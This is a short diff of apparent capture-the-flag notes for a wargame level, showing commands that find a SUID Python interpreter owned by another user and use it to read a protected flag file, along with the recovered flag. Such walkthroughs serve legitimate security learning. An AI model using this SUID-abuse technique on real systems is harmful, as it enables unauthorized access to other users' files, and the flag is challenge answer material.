@@ -3,4 +3,8 @@
 
 goal: find password for phantom5
 
-/usr/local/bin/phantom-python3 -c 'print(open(\"/var/lib/phantom-flags/level4_flag\").read().strip())': bl_phtm4_81dfa6befd385db4
+cat ~/BRIEFING: SUID interpreter not owned by root
+find / -perm -4000 -type f 2>/dev/null: /usr/local/bin/phantom-python3
+ls -la /usr/local/bin/phantom-python3: SUID owned by flagkeeper4
+
+/usr/local/bin/phantom-python3 -c 'print(open("/var/lib/phantom-flags/level4_flag","r").read().strip())': bl_phtm4_81dfa6befd385db4
